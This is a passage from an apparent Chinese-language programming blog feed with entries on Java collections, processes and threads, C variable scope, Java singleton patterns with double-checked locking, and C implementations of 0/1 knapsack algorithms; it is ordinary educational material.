hash用于计算对象应该保存在table数组的哪个索引处。HashMap底层数组的长度总是2的n次方，当数组长度为2的n次幂的时候，(n - 1) &amp; hash 算得的index相同的几率较小，数据在数组上分布就比较均匀，也就是说碰撞的几率小，相对的，查询的时候就不用遍历某个位置上的链表，这样查询效率也就较高了。 LinkedHashMap深入了解LinkedHashMap继承自HashMap，它主要是用链表实现来扩展HashMap类，HashMap中条目是没有顺序的，但是在LinkedHashMap中元素既可以按照它们插入图的顺序排序，也可以按它们最后一次被访问的顺序排序。 TreeMap深入了解TreeMap基于红黑树数据结构的实现，键值可以使用Comparable或Comparator接口来排序。TreeMap继承自AbstractMap，同时实现了接口NavigableMap，而接口NavigableMap则继承自SortedMap。SortedMap是Map的子接口，使用它可以确保图中的条目是排好序的。在实际使用中，如果更新图时不需要保持图中元素的顺序，就使用HashMap，如果需要保持图中元素的插入顺序或者访问顺序，就使用LinkedHashMap，如果需要使图按照键值排序，就使用TreeMap。 总结 Java集合框架主要包括Collection和Map两种类型。其中Collection又有3种子类型，分别是List(ArrayList,LinkedList)、Set(HashSet,LinkedHashSet,TreeSet)、Queue。Map中存储的主要是键值对映射,有HashMap,LinkedHashMap,TreeMap。 规则集Set中存储的是不重复的元素，线性表中存储可以包括重复的元素，Queue队列描述的是先进先出的数据结构，可以用LinkedList来实现队列。 效率上，规则集比线性表更高效。 ArrayList主要是用数组来存储元素，LinkedList主要是用链表来存储元素，HashMap的底层实现主要是借助数组+链表+红黑树来实现。 Vector、HashTable等集合类效率比较低但都是线程安全的。包java.util.concurrent下包含了大量线程安全的集合类，效率上有较大提升。 说了这么多，搭建应该都ok不？其实跑来跑去就在数组，链表，树之间在转，所以数据结构很重要，数据结构就是根据某种结构去设计这些东西，要从效率上去体会，还有就是各有优点。比如ArrayList，LinkedList采用了数组和链表，都知道数组和链表都是有序的，那么我能不能先无序的放，然后再排序呢，当然是可以的，不就有HashSet了吗？然后又有LinkedHashSet，你们可能有疑问，为什么不是ArrayHashSet，那你学了数据结构就知道，数组是连在一起分配内存的，而链表是有内存就行，因为我存的有下一个数据的地址。那么Set本来就是无序放的，你用数组难道重新创建空间吗？所以咯就是LinkedHashSet，是不是明朗了。为什么要有个TreeSet呢？学过二叉树的都知道，二叉树有先序遍历，中序遍历，后序遍历，那么树是不是又强大了一些呢？就是这样，连后面人们想Map的时候也是这样创建的。很牛。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程与线程的联系和区别]]></title>
    <url>%2F2017%2F01%2F01%2Ffirst%2F</url>
    <content type="text"><![CDATA[线程的基本概念线程是进程中执行运算的最小单位，是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行(引起线程安全的原因)。这句话总的来说就是，进程里面放的是一个系统的所有资源，然后开了一个线程，这个线程对资源具有相应的操作，并且每个进程必定有一个线程，否则进程资源无效。我认为创建线程的主要目的就是把拥有的资源和操作资源的过程分开，分开之后有什么好处呢。我可以开多个线程啊，开多个线程就能操作资源，多方便啊。也许你们还有疑问，难道我不能多开一个进程吗？那你想一下，如果这样那么就不需要线程，你开一个进程也就是说每个资源你都要复制一遍，存储起来，然后再用进程进行操作。这样多麻烦呀。所以人们就把线程给想出来了，我把资源给放到进程里面，然后再开线程去操作这些资源，而且我开线程也不用复制资源，直接使用，是不是很方便，伟大的人们真会想。哈哈。不说了，能理解就行。 线程的优点 易于调度(这跟他不拥有资源是有一定关系的) 提高并发性。通过线程可方便有效地实现并发性。进程可以创建多个线程来执行同一程序的不同部分。(刚才已经说了，线程不需要拥有资源，直接拿资源来用，所以这也是他的有效性) 开销少。创建线程要比创建进程要快(还是那个原因) 利于充分发挥多处理器的功能。通过创建多线程进程，每个线程在一个处理器上运行，从而实现应用程序的并发性，使每个处理器都得到充分运行。(不知道你们这看懂了没，有人会问，我擦，你每个线程在不同的处理器上运行，不就乱了套了吗？那我只想说，你对计算机内部不了解，计算机有内存，硬盘，CPU(处理器，寄存器等)，其实你的资源都在内存里，处理器只是做运算的或者是I/O的)进程的基本状态及状态之间的关系状态:运行、阻塞、挂起阻塞、就绪、挂起就绪状态之间的转换:准备就绪的进程，被CPU调度执行，变成运行态；运行中的进程，进行I/O请求或者不能得到所请求的资源，变成阻塞态运行中的进程，进程执行完毕(或者时间片已到)，变成就绪态将阻塞态的进程挂起，变成挂起阻塞态，当导致进程阻塞的I/O操作在用户重启进程前完成，挂起阻塞态变成挂起就绪态，当用户在I/O操作结束之前重启进程，挂起阻塞态变成阻塞态。将就绪(或运行)中的进程挂起，变成挂起就绪态，当进程恢复之后，挂起就绪态变成就绪态。线程与进程的关系 一个线程只属于一个进程，而一个进程可以有多个线程，但至少有一个线程。 资源分配给进程，同一进程的所有线程共享该进程的所有资源。 处理机分给线程，即真正在处理机上运行的线程。 线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。线程是指进程内的一个执行单元也是进程内的可调度的实体。意思就是说，你有进程没得线程都是白搭，线程是进程运行的最小单位。线程与进程的区别 调度:线程作为调度和分配的基本单位，进程作为拥有资源的基本单位 并发性:不仅进程之间可以并发执行，同一个进程的多个线程之间也可并发执行 拥有资源:进程是拥有资源的一个独立单位，线程不拥有系统资源，但可以访问隶属于进程的资源 系统开销:在创建或者撤销进程时，由于系统都要为之分配和回收资源，导致系统的开销明显大于创建或撤销线程时的开销。进程间的通信方式 管道:管道可用于具有亲缘关系的父子进程间的通信，有名管道除了具有管道所具有的功能外，它还允许无亲缘关系进程间的通信。 信号:信号是在软件层次上对中断机制的一种模拟，他是比较复杂的通信方式，用于通知进程有某件事发生，一个进程收到一个信号与处理器收到一个中断请求效果上可以说一致的。 消息队列:消息队列是消息的链表，它克服了以上两种通信方式中信号量有限的缺陷，具有写权限的进程可以按照一定得规则向消息队列中添加新信息；对消息队列有读权限的进程则可以从消息队列中读取信息。 共享内存:可以说这是最有用的进程间通信方式。它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。 信号量:主要作为进城之间及同一种进程的不同线程之间得同步和互斥手段。 套接字:这是一种更为一般得进程间通信机制，它可用于网络中不同机器之间的进程间通信，应用非常广泛。进程或线程I/O阻塞关于I/O操作为什么要被阻塞，想必很多人有这样的问题，那么我今天就总结一下。IO所需要的CPU资源非常少，大部分工作是分派给了DMA完成的。对于磁盘I/O，CPU是不会直接和硬盘对话的，他们之间有个中间人，叫DMA芯片CPU计算文件地址==&gt;委派DMA读取文件==&gt;DMA接管总线==&gt;CPU的A进程阻塞，挂起==&gt;CPU切换到B进程==&gt;DMA读完文件后通知CPU(一个中断异常)==&gt;CPU切换回A进程操作文件 计算机硬件上使用DMA来访问磁盘等IO，也就是请求发出后，CPU就不再管了，直到DMA处理器完成任务，再通过中断告诉CPU完成了。所以，单独的一个IO时间，对CPU的占用是很少的，阻塞了就更不会占用CPU了，因为程序都不继续运行了，CPU时间交给其它线程和进程了。虽然IO不会占用大量的CPU时间，但是非常频繁的IO还是会非常浪费CPU时间的，所以面对大量IO的任务，有时候是需要算法来合并IO，或者通过cache来缓解IO压力的。]]></content>
      <categories>
        <category>Linux</category>
        <category>进程</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[变量生命周期，作用域]]></title>
    <url>%2F2016%2F12%2F30%2Fthird%2F</url>
    <content type="text"><![CDATA[全局变量、局部变量、静态全局变量、静态局部变量分析1、根据定义的位置的不同的生命周期，具有不同的作用域，作用域分为六种:全局作用域，局部作用域，语句作用域，类作用域，命名空间作用域，文件作用域。2、从作用域看: 全局变量具有全局作用域。全局变量只需在一个文件中定义，就可以作用于所有的源文件。当然，其他不包含全局变量定义的源文件需要用extern关键字再次声明这个全部变量。 静态局部变量具有局部作用域，它只被初始化一次，自从第一次被初始化直到程序运行结束都一直存在，它和全局变量的区别在于全局变量对所有的函数都是可见的，而静态局部变量只对定义自己的函数体可见。 局部变量也只有局部作用域，它是自动对象，他在程序运行期间不是一直存在，而是只在函数执行期间存在，函数的一次调用执行结束后，变量被撤销，其所占有的内存也被收回。而且每次执行函数时他都要被初始化。 静态全局变量也具有全局作用域，他与全局变量的区别在于如果程序包含多个文件的话，它作用于定义它的文件里，不能作用到其他文件里，即被static关键字修饰过的变量具有文件作用域。这样即使两个不同的源文件定义了相同名字的静态全局变量，他们也是不同的变量。3、从分配的空间看: 全局变量，静态局部变量，静态全局变量都在静态存储区分配空间，而局部变量在栈里分配空间。(内存分区说明:栈中分配局部变量的空间,堆用于分配程序员申请的内存空间，静态区是分配静态局部变量，静态全局变量，全局变量。只读区分配常量和程序代码空间的) 全局变量本身就是静态存储方式，静态全局变量当然也是静态存储方式。这两者在存储方式上并无不同。这两者的区别在于静态全局变量的作用域是整个源程序，当一个源程序由多个源文件组成时，非静态的全局变量在各个源文件中都是有效的。而静态变量则限制了其作用域，即只在定义该变量的源文件内有效，在同一源程序的其他源文件中不能使用它。由于静态全局变量的作用域局限于一个源文件内，只能为该源文件内的函数公用，因此可以避免在其它源文件中引起错误。4、静态变量会被放在程序的静态数据存储区(全局可见)中，这样可以在下一次调用的时候还可以保持原来的赋值。这一点是它与堆栈变量和堆变量的区别。5、变量用static告知编译器，自己仅仅在变量的作用范围内可见。这一点是它与全局变量的区别。6、从以上分析可以看出， 把局部变量改变为静态变量后是改变了它的存储方式即改变了它的生存期。把全局变量改变为静态变量后是改变了它的作用域，限制了它的使用范围。因此static 这个说明符在不同的地方所起的作用是不同的。应予以注意。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式之单例模式]]></title>
    <url>%2F2016%2F12%2F30%2Ffourth%2F</url>
    <content type="text"><![CDATA[应用场景一般一个类能否做成单例，最容易区别的地方就在于，这些类，在应用中如果有两个或者两个以上的实例会引起错误，又或者我换句话说，就是这些类，在整个应用中，同一时刻，有且只能有一种状态。一般实践当中，有很多应用级别的资源会被做成单例，比如配置文件信息，逻辑上来讲，整个应用有且只能在同在时间有一个，当然如果你有多个，这可能并不会引起程序级别错误，这里指的错误特指异常或者ERROR。但是当我们试图改变配置文件的时候，问题就出来了。 你有两种选择，第一种，将所有的实例全部更新成一模一样的状态。第二种，就是等着出现问题。然而出现的问题大部分是逻辑层次上的错误，个人觉得这是比程序错误更加严重的错误，因为它不会告诉你空指针，不会告诉你非法参数，很多时候要等到影响到客户使用时才会被发现。 最原始的单例模式1234567891011121314public class Singleton &#123; //一个静态的实例 private static Singleton singleton; //私有化构造函数 private Singleton()&#123;&#125; //给出一个公共的静态方法返回一个单一实例 public static Singleton getInstance()&#123; if (singleton == null) &#123; singleton = new Singleton(); &#125; return singleton; &#125; &#125; 这是在不考虑并发访问的情况下标准的单例模式的构造方式，这种方式通过几个地方来限制了我们取到的实例时唯一的。1、静态实例，带有static关键字的属性在每一个类中都是唯一的。2、限制客户端随意创造实例，即私有化构造方法，此为保证单例的最重要的一步。3、给一个公共的获取实例的静态方法，注意，是静态方法，因为这个方法是在我们未获取到实例的时候就要提供给客户端调用的，所以如果是非静态的话，那就变成了一个矛盾体了，因为非静态的方法必须要拥有实例才可以调用。4、判断只有持有的静态实例为null时才调用构造方法创造一个实例，否则就直接返回。那么这样的单例设计模式是否就已经满足所有的情况了呢？大家都知道并发情况，那么当同时有多个线程都去创建这个实例，是否会出现这样的问题呢？答案肯定是会的。我来用代码说明1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.util.Collections; import java.util.HashSet; import java.util.Set; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class TestSingleton &#123; boolean lock ; public boolean isLock() &#123; return lock; &#125; public void setLock(boolean lock) &#123; this.lock = lock; &#125; public static void main(String[] args) throws InterruptedException &#123; final Set&lt;String&gt; instanceSet = Collections.synchronizedSet(new HashSet&lt;String&gt;()); final TestSingleton lock = new TestSingleton(); lock.setLock(true); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 100; i++) &#123; executorService.execute(new Runnable() &#123; public void run() &#123; while (true) &#123; if (!lock.isLock()) &#123; Singleton singleton = Singleton.getInstance(); instanceSet.add(singleton.toString()); break; &#125; &#125; &#125; &#125;); &#125; Thread.sleep(5000); lock.setLock(false); Thread.sleep(5000); System.out.println("------并发情况下我们取到的实例------"); for (String instance : instanceSet) &#123; System.out.println(instance); &#125; executorService.shutdown(); &#125; &#125; 我在程序中同时开启了100个线程，去访问getInstance方法，并且把获得实例的toString方法获得的实例字符串装入一个同步的set集合，set集合会自动去重，所以看结果如果输出了两个或者两个以上的实例字符串，就说明我们在并发访问的过程中产生了多个实例。程序当中让main线程睡眠了两次，第一次是为了给足够的时间让100个线程全部开启，第二个是将锁打开以后，保证所有的线程都已经调用了getInstance方法。为什么我们可以创建多个实例？ 造成这种情况的原因是因为，当并发访问的时候，第一个调用getInstance方法的线程A，在判断完singleton是null的时候，线程A就进入了if块准备创造实例，但是同时另外一个线程B在线程A还未创造出实例之前，就又进行了singleton是否为null的判断，这时singleton依然为null，所以线程B也会进入if块去创造实例，这时问题就出来了，有两个线程都进入了if块去创造实例，结果就造成单例模式并非单例。 提高单例模式 为了避免这种情况，我们就要考虑并发的情况了，我们最容易想到的方式应该是下面这样的方式，直接将整个方法同步。 123456789101112131415 public class BadSynchronizedSingleton &#123; //一个静态的实例 private static BadSynchronizedSingleton synchronizedSingleton; //私有化构造函数 private BadSynchronizedSingleton()&#123;&#125; //给出一个公共的静态方法返回一个单一实例 public synchronized static BadSynchronizedSingleton getInstance()&#123; if (synchronizedSingleton == null) &#123; synchronizedSingleton = new BadSynchronizedSingleton(); &#125; return synchronizedSingleton; &#125; &#125; 上面的做法很简单，就是将整个获取实例的方法同步，这样在一个线程访问这个方法时，其它所有的线程都要处于挂起等待状态，倒是避免了刚才同步访问创造出多个实例的危险，但是我只想说，这样的设计实在是糟糕透了，这样会造成很多无谓的等待.其实我们同步的地方只是需要发生在单例的实例还未创建的时候，在实例创建以后，获取实例的方法就没必要再进行同步控制了.123456789101112131415161718public class SynchronizedSingleton &#123; //一个静态的实例 private static SynchronizedSingleton synchronizedSingleton; //私有化构造函数 private SynchronizedSingleton()&#123;&#125; //给出一个公共的静态方法返回一个单一实例 public static SynchronizedSingleton getInstance()&#123; if (synchronizedSingleton == null) &#123; synchronized (SynchronizedSingleton.class) &#123; if (synchronizedSingleton == null) &#123; synchronizedSingleton = new SynchronizedSingleton(); &#125; &#125; &#125; return synchronizedSingleton; &#125; &#125; 二次判断synchronizedSingleton是否为null假设我们去掉同步块中的是否为null的判断，有这样一种情况，假设A线程和B线程都在同步块外面判断了synchronizedSingleton为null，结果A线程首先获得了线程锁，进入了同步块，然后A线程会创造一个实例，此时synchronizedSingleton已经被赋予了实例，A线程退出同步块，直接返回了第一个创造的实例，此时B线程获得线程锁，也进入同步块，此时A线程其实已经创造好了实例，B线程正常情况应该直接返回的，但是因为同步块里没有判断是否为null，直接就是一条创建实例的语句，所以B线程也会创造一个实例返回，此时就造成创造了多个实例的情况。 如果我们深入到JVM中去探索上面这段代码，它就有可能（注意，只是有可能）是有问题的。 因为虚拟机在执行创建实例的这一步操作的时候，其实是分了好几步去进行的，也就是说创建一个新的对象并非是原子性操作。 创建新的对象分三步: 分配内存 初始化构造器 将对象指向分配的内存的地址这种顺序在上述双重加锁的方式是没有问题的，因为这种情况下JVM是完成了整个对象的构造才将内存的地址交给了对象。但是如果2和3步骤是相反的（2和3可能是相反的是因为JVM会针对字节码进行调优，而其中的一项调优便是调整指令的执行顺序），就会出现问题了。因为这时将会先将内存地址赋给对象，针对上述的双重加锁，就是说先将分配好的内存地址指给synchronizedSingleton，然后再进行初始化构造器，这时候后面的线程去请求getInstance方法时，会认为synchronizedSingleton对象已经实例化了，直接返回一个引用。如果在初始化构造器之前，这个线程使用了synchronizedSingleton，就会产生莫名的错误。 单例模式再进阶标准的单例模式 12345678910111213141516 package com.oneinstance; public class Singleton &#123; private Singleton()&#123;&#125; public static Singleton getInstance()&#123; return SingletonInstance.instance; &#125; private static class SingletonInstance&#123; static Singleton instance = new Singleton(); &#125; &#125; 首先来说一下，这种方式为何会避免了上面莫名的错误，主要是因为一个类的静态属性只会在第一次加载类时初始化，这是JVM帮我们保证的，所以我们无需担心并发访问的问题。所以在初始化进行一半的时候，别的线程是无法使用的，因为JVM会帮我们强行同步这个过程。另外由于静态变量只初始化一次，所以singleton仍然是单例的。最终就是采用了静态内部类，创建了单例，他保证了 Singleton最多只有一个实例，在不考虑反射强行突破访问限制的情况下。 保证了并发访问的情况下，不会发生由于并发而产生多个实例。 保证了并发访问的情况下，不会由于初始化动作未完全完成而造成使用了尚未正确初始化的实例。一切在你没用到的时候都成了不在乎的东西，现在用到了，是不是觉得特别厉害。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[01背包]]></title>
    <url>%2F2016%2F12%2F30%2Fsecond%2F</url>
    <content type="text"><![CDATA[01背包问题蛮力算法求解1、根据物品个数n，我们都知道每一个物品都有放与不放两种情况，那么就有2的n次方中情况，那么我们就一种一种情况进行比较，那么首先我们要做一个b[n]的数组，这个数组每次都要根据情况算法算出一种情况保存在b[n]数组中，得到情况数组后，我们进行装背包和价格累加运算，最后算出来后看这种情况装的物品重量是否大于背包的总重量，如果大于则不符合，直接淘汰，如果小于等于背包的总重量，那么进行与之前可以装背包的物品价值进行比较，如果当前情况的价值小于之前的价值，直接淘汰，如果当前情况的价值大于之前的价值，保存此刻的价值，并把情况数组赋值给最终情况数组，作为装包的物品记录。那么最后输出总价值，和装入的物品就是根据计算后的总价值和最终的情况数组。这是我对蛮力算法求解这个问题的理解。2、剖析代码1234567891011void conversion(int n,int b[MAX])&#123; int i; for(i=0;i&lt;MAX;i++) &#123; b[i] = n%2; n = n/2; if(n==0) break; &#125;&#125; 这段代码很经典，符合场景为:比如你每一个事件都有放与不放，走与不走两种情况，那么你有m个事件，你就有pow(2,m)中情况，那么要怎么列举出来呢，难道要11,00,10,01写出来吗？肯定不会。那么这个方法，就是你把是第n种情况的n传进去，那么他就会给你计算出一个一维数组，那么这个一维数组就是你m个事件中的一种情况。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354void force()&#123; int i,j,c,b[MAX],temp[MAX]; int tw,maxv,v[MAX],temp_w,temp_v; printf("\t\t\t输入物品个数 n:"); scanf("%d",&amp;n); //n为个数 printf("\n"); printf("\t\t\t输入背包重量 c:"); scanf("%d",&amp;tw); //tw为重量 printf("\n"); for(i=0;i&lt;n;i++) &#123; printf("\t\t\t输入第 %d 个物品的重量,价格",i+1); printf("\n\t\t\t"); scanf("%d,%d",&amp;w[i],&amp;v[i]); //w数组为重量，v为价格 &#125; maxv = 0; for (i=0;i&lt;pow(2,n);i++) &#123; for (j=0;j&lt;n;j++) &#123; b[j] = 0; &#125; conversion(i,b); temp_v = 0; temp_w = 0; for (j=0;j&lt;n;j++) &#123; if (b[j]==1) &#123; temp_w = temp_w+w[j]; temp_v = temp_v + v[j]; &#125; &#125; if ((temp_w &lt;= tw)&amp;&amp;(temp_v&gt;maxv)) &#123; for (j=0;j&lt;n;j++) &#123; temp[j] = 0; &#125; maxv = temp_v; for (j=0;j&lt;n;j++) &#123; temp[j] = b[j]; &#125; &#125; &#125; printf("\t\t\t此背包能装的最大价值:%d\n",maxv); printf("\t\t\t选择的物品有:\n"); for (j=0;j&lt;n;j++) &#123; if(temp[j]) printf("\t\t\t第%d个物品，重量 为%d，价值为%d\n", j+1,w[j],v[j]); &#125;&#125; 然后把每一种情况都算一遍，看在满足背包容量的情况下是否有最大价值，这里面隐含了一个冒泡排序，只是有点分散了，不太明显，但还是有的。最后maxv，temp放的是最大价值和最终放的物品，temp一维数组中，标识位为1对应的下表值就是第几个物品已装入。 01背包问题递归算法求解1、01背包问题，是当背包装入物品的重量不得大于背包的容量，所以递归的边界分为两种，一种就是装入的物品重量大于背包的容量则返回，当装完当前的物品则返回。分为两种递归，一种是放入此物品递归，另一种是不放入此物品递归，而且当递归返回的时候要判断两种装入和不装入递归返回的大小，那么当返回装入此物品的时候，就要加上这个物品的价值。在装入这个物品时候，设置一个标识位，表示这个物品装入了。最终按照这个标志位来输出放入的物品。2、剖析代码12345678910111213int Make(int i,int j)&#123; int res; if(i==-1)&#123; return 0; &#125; else if(j&gt;=w[i]&amp;&amp;Make(i-1,j)&lt;Make(i-1,j-w[i])+p[i])&#123; x[i]=1; return Make(i-1,j-w[i])+p[i]; &#125;else&#123; x[i]=0; return Make(i-1,j); &#125; &#125; 为什么是i==-1，因为我用一维数组存的物品和重量，那么最终装完，要不是到下标值为4或者为0，所以如果采用从0开始，结束的应该是i==5，如果采用从4开始，结束的应该是i==-1，都可以用。第二个else if是第二个结束条件，每次都要判断当前背包的重量是否能装入这个物品，如果能还要判断当装入了这个物品和没装入这个物品两者的价值比较，如果装入的价值大于没装入的肯定要装进去咯。这里可能你们会有点疑问，装入后肯定价值要大一些呀，其实这里的装入，是最终的装入，这里有点不好说清楚，就是你已经递归完成后，其实所有的情况的总价值都算出来，倒过来在看装入这个物品的总价值和没装入这个物品的总价值进行对比。就是说向下的递归条件还有加入这个物品的总价值进行比较，来决定他放不放。传入的就是物品个数和背包重量，因为这两个是结束条件，而另一个隐含的结束条件就是总价值大小。 01背包问题动态规划算法求解动态规划建立递推关系，建立二维数组，二维数组的行容量为物品的重量加1，而列容量为物品的个数。那么在第一个物品装包的时候我们向二维数组的第一行写入在背包总容量之下的每一个容量所能装入的物品产生的价值。第一个装入的物品可以作为初始化递推条件。在进行下面物品递推的过程中，我们以上一行作为基础，进行递推。那么在进行下一行的最大价值结算要结合上一行的价值的大小进行比较或者相加。得出此时的最大价值。以此类推最终形成整个二维表。然后从二维表的最右端的最下面与它的上一行进行比较如果他大于上一行就进行装包，如果不大于则往上移进行比较，若他大于他的上一行就装包。最终计算出装包的所有物品。这个我认为是最有思想的了，这个要把模型建立起来，如果没有模型不好想，因为我一开始一直在一维空间里面想，就算开始进入了二维空间，一会又乱了，可能我画图会画顺推的图，代码写逆推的。就拿背包容量为10，第一个物品重量2,6第二个2,3，第三个6,5，第四个5,4，第五个4，6. 物品重量 0 1 2 3 4 5 6 7 8 9 10 2,6 0 0 6 6 6 6 6 6 6 6 6 2,3 0 0 6 6 9 9 9 9 9 9 9 6,5 0 0 6 6 9 9 9 9 11 11 14 5,4 0 0 6 6 9 9 9 10 11 13 14 4,6 0 0 6 6 9 9 12 12 15 15 15 这就是整个分析图。我来说说怎么分析的吧！首先二维数组的横下标表示当前背包当前的容量，那么在当前容量下到底能放什么呢？就要根据这个二维表来算，怎么算呢？我按行来分析吧！我们要先初始化一个物品作为二维表的第一行，随便拿一个，比如说我第一行放的是2,6这个物品，那么当背包容量为0时放不下，价值就为零，1时放不下价值为0,2时放得下了那么价值就变为6了是不是。也就是说你给我背包容量大于2的我都能放得下这个物品，价值为6.这时候来了第二个物品，我们还是先按照第一个物品来算，背包容量为0时，放不下，最大价值为0,1时还是放不下，2时可以放下了，但是你要考虑最大价值，现在有两个物品，并且背包容量只有2,那么这时候的步骤应该是这样的你要用此刻的背包容量减去你当前要装的物品剩下的容量对应的价值是多少，然后加上当前物品的价值，然后再与上面的背包容量为2所装的东西进行比较，发现之前的背包容量为2的价值比你现在还要大，所以你这个没必要装。以此类推，最终得到这个二维表，发现最终得到的最大价值为15。到这还没结束，你还要把装进去的物品推出来。先比较最后一个物品是否装进去了，如果最后一行的最后一列大于倒数第二行的最后一列说明已经装进去了，如果没有那么找倒数第二行的最大值与上一个比较，找到之后用10减去4得到6，那么找到上一行的第六列再与上一行的第六列进行比较，如果相等再往上一行比较，知道找到变化的一行，以次类推找出所有装入背包的物品。下面给出逆推算法123456789101112131415161718192021222324252627282930313233343536373839void dynamic()&#123; int i,j,cw,c,sw,sp,a[MAX],b[MAX],g[MAX][10*MAX]; printf("\t\t\t输入物品个数 n:"); scanf("%d",&amp;n); printf("\t\t\t输入背包重量 c:"); scanf("%d",&amp;c); for(i=1;i&lt;=n;i++)&#123; printf("\t\t\t输入第 %d个物品的重量,价值:",i); printf("\n\t\t\t"); scanf("%d,%d",&amp;b[i],&amp;a[i]); &#125; for(j=0;j&lt;=c;j++) if(j&gt;=b[1]) g[1][j]=a[1]; else g[1][j]=0; for (i = 2; i &lt;=n; i++) for (j = 0; j &lt;= c; j++) if(j&gt;=b[i]&amp;&amp;g[i-1][j]&lt;g[i-1][j-b[i]]+a[i]) g[i][j]=g[i-1][j-b[i]]+a[i]; else g[i][j]=g[i-1][j]; cw=c; printf("\t\t\tc=%d\n",c ); printf("\t\t\t选择的物品有:\n"); for(sp=0,sw=0,i=n;i&gt;=2;i--) if(g[i][cw]&gt;g[i-1][cw])&#123; cw-=b[i]; sw+=b[i]; sp+=a[i]; printf("\t\t\t第%2d个物品，重量为 %3d 价格为%3d\n",i,b[i],a[i]); &#125; if(g[n][c]-sp==a[i])&#123; sw+=b[i]; sp+=a[i]; printf("\t\t\t第%2d个物品，重量为%3d 价格为 %3d\n",1,b[1],a[1] ); &#125; printf("\t\t\t重量=%d , 价格=%d\n",sw,sp );&#125; 这个就是实现01背包的三种算法。总结:蛮力算法，我认为就是把所有的情况都列出来，在列出情况之前没有限制条件，然后再根据每种情况，做实际的运算，然后根据限制条件判断此种情况是否符合当前问题的解决方案。递归算法，我认为递归算法首先要找出递归的边界作为你递归的终结条件，而且这个条件的变量要作为递归式的形参，因为在往下传的时候肯定要改变这个条件，那么唯一能够动态改变值并且能够作为条件的就是形参。所以我们要把关于递归条件的放入形参。然后再设计递归式。动态规划算法：这个我认为是最能理解的算法，根据背包容量和物品个数建立模型，然后根据模型进行推论，然后再根据推论设计算法。最终解决问题。关于时间复杂度和空间复杂度，根据运行的时间结果，蛮力是最消耗时间的，而动态规划是时间消耗最短的。而至于递归，我感觉他利用了栈先进后出，消耗的空间要大一些。另外，根据这些算法，我感觉解决一个问题最难的就是推导，比如说动态规划一开始就要给这个问题，建立模型，那么在抉择哪个模型适合是很困难的。附录:完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;math.h&gt;#include &lt;Windows.h&gt;# define MAX 100 LARGE_INTEGER nFreq; //传出参数 LARGE_INTEGER nBeginTime; //传出起始时间 LARGE_INTEGER nEndTime; //传出结束时间 static int p[MAX]=&#123;0&#125;,w[MAX]=&#123;0&#125;,x[MAX]=&#123;0&#125;;int n;int Make(int i,int j)&#123; int res; if(i==-1)&#123; return 0; &#125; else if(j&gt;=w[i]&amp;&amp;Make(i-1,j)&lt;Make(i-1,j-w[i])+p[i])&#123; x[i]=1; return Make(i-1,j-w[i])+p[i]; &#125;else&#123; x[i]=0; return Make(i-1,j); &#125; &#125;void conversion(int n,int b[MAX])&#123; int i; for(i=0;i&lt;MAX;i++) &#123; b[i] = n%2; n = n/2; if(n==0) break; &#125;&#125;int getNum(int i)&#123; srand((unsigned)time(NULL)); int number=rand()%(i+1); return number;&#125;void force()&#123; int i,j,c,b[MAX],temp[MAX]; int tw,maxv,v[MAX],temp_w,temp_v; printf("\t\t\t输入物品个数 n:"); scanf("%d",&amp;n); //n为个数 printf("\n"); printf("\t\t\t输入背包重量 c:"); scanf("%d",&amp;tw); //tw为重量 printf("\n"); for(i=0;i&lt;n;i++) &#123; printf("\t\t\t输入第 %d 个物品的重量,价格",i+1); printf("\n\t\t\t"); scanf("%d,%d",&amp;w[i],&amp;v[i]); //w数组为重量，v为价格 &#125; maxv = 0; for (i=0;i&lt;pow(2,n);i++) &#123; for (j=0;j&lt;n;j++) &#123; b[j] = 0; &#125; conversion(i,b); temp_v = 0; temp_w = 0; for (j=0;j&lt;n;j++) &#123; if (b[j]==1) &#123; temp_w = temp_w+w[j]; temp_v = temp_v + v[j]; &#125; &#125; if ((temp_w &lt;= tw)&amp;&amp;(temp_v&gt;maxv)) &#123; for (j=0;j&lt;n;j++) &#123; temp[j] = 0; &#125; maxv = temp_v; for (j=0;j&lt;n;j++) &#123; temp[j] = b[j]; &#125; &#125; &#125; printf("\t\t\t此背包能装的最大价值:%d\n",maxv); printf("\t\t\t选择的物品有:\n"); for (j=0;j&lt;n;j++) &#123; if(temp[j]) printf("\t\t\t第%d个物品，重量 为%d，价值为%d\n", j+1,w[j],v[j]); &#125;&#125;void recursive()&#123; int i,j,c,cw,sw,sp; printf("\t\t\t输入物品的个数 n:"); scanf("%d",&amp;n); printf("\t\t\t输入背包的重量 c:"); scanf("%d",&amp;c); for(i=0;i&lt;n;i++)&#123; printf("\t\t\t输入第%d个物品的重量，价格",i+1 ); printf("\n\t\t\t"); scanf("%d,%d",&amp;w[i],&amp;p[i]); &#125; int maxNum=Make(n-1,c); printf("\t\t\t此背包能装的最大价值:%d\n",maxNum); 